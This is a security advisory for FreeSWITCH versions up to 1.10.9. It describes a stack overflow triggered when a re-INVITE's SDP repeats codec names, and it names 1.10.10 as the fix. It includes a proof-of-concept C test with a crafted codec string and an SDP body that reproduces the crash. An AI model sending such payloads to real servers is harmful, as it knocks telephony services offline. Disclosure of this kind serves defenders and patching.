# FreeSWITCH allows authorized users to cause a denial of service attack by sending re-INVITE with SDP containing duplicate codec names

High

[briankwest](/briankwest)
published
GHSA-gjj5-79p2-9g3q
Sep 13, 2023

## Package

FreeSWITCH
(C)

## Affected versions

<= 1.10.9

## Patched versions

1.10.10

## Description

## Summary

FreeSWITCH allows authorized users to cause a denial of service attack by sending re-INVITE with SDP containing duplicate codec names

## Description

When a call in FreeSWITCH completes codec negotiation, the `codec_string` channel variable is set with the result of the negotiation. On a subsequent re-negotiation, if an SDP is offered that contains codecs with the same names but with different formats, there may be too many codec matches detected by FreeSWITCH leading to overflows of its internal arrays.

## Impact

By abusing this vulnerability, an attacker is able to corrupt stack of FreeSWITCH leading to an undefined behavior of the system or simply crash it.

## How to reproduce the issue

The following FreeSWITCH test will reproduce the attack. This test requires mod\_av and mod\_opus modules to be loaded.

```
FST_SESSION_BEGIN(matches_and_greedy_sort)
{
	switch_status_t status;
	switch_media_handle_t *media_handle;
	switch_core_media_params_t *mparams;
	char *r_sdp, *codec_string;
	uint8_t match = 0, p = 0;

	switch_channel_set_variable(fst_channel, "rtp_codec_negotiation", "greedy");
	codec_string = "CORE_VPX_MODULE.VP8,mod_opus.opus@48000h@20i,CORE_PCM_MODULE.PCMU@8000h@20i@64000b,CORE_PCM_MODULE.PCMA@8000h@20i@64000b,mod_av.H264~level-asymmetry-allowed=1;packetization-mode=1;profile-level-id=42001f,mod_av.H264~level-asymmetry-allowed=1;packetization-mode=0;profile-level-id=42001f,mod_av.H264~level-asymmetry-allowed=1;packetization-mode=1;profile-level-id=42e01f,mod_av.H264~level-asymmetry-allowed=1;packetization-mode=0;profile-level-id=42e01f,mod_av.H264~level-asymmetry-allowed=1;packetization-mode=1;profile-level-id=4d001f,CORE_VPX_MODULE.VP9~profile-id=0,CORE_VPX_MODULE.VP9~profile-id=2,mod_av.H264~level-asymmetry-allowed=1;packetization-mode=1;profile-level-id=64001f";

	switch_channel_set_variable(fst_channel, "codec_string", codec_string);

	mparams = switch_core_session_alloc(fst_session, sizeof(switch_core_media_params_t));
	mparams->rtpip = switch_core_session_strdup(fst_session, "127.0.0.1");

	status = switch_media_handle_create(&media_handle, fst_session, mparams);
	fst_check(status == SWITCH_STATUS_SUCCESS);

	r_sdp = "v=0\n"
		"o=Z 0 645783902 IN IP4 127.0.0.1\n"
		"s=Z\n"
		"c=IN IP4 127.0.0.1\n"
		"t=0 0\n"
		"m=video 65201 RTP/AVP 103 116 118 119 120 121 122\n"

		"a=rtpmap:116 VP8/90000\n"
		"a=rtpmap:118 H264/90000\n"
		"a=fmtp:118 profile-level-id=42E020; packetization-mode=0; sprop-parameter-sets=Z0LAFoyNQFAekA8IhGo=,aM48gA==\n"
		"a=rtpmap:119 H264/90000\n"
		"a=fmtp:119 profile-level-id=42E020; packetization-mode=1; sprop-parameter-sets=Z0LAFoyNQFAekA8IhGo=,aM48gA==\n"

		"a=fmtp:121 profile-level-id=42E022; packetization-mode=0; sprop-parameter-sets=Z0LAFoyNQFAekA8IhGo=,aM48gA==\n";
	match = switch_core_media_negotiate_sdp(fst_session, r_sdp, &p, SDP_TYPE_REQUEST);
}
FST_SESSION_END()

```

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
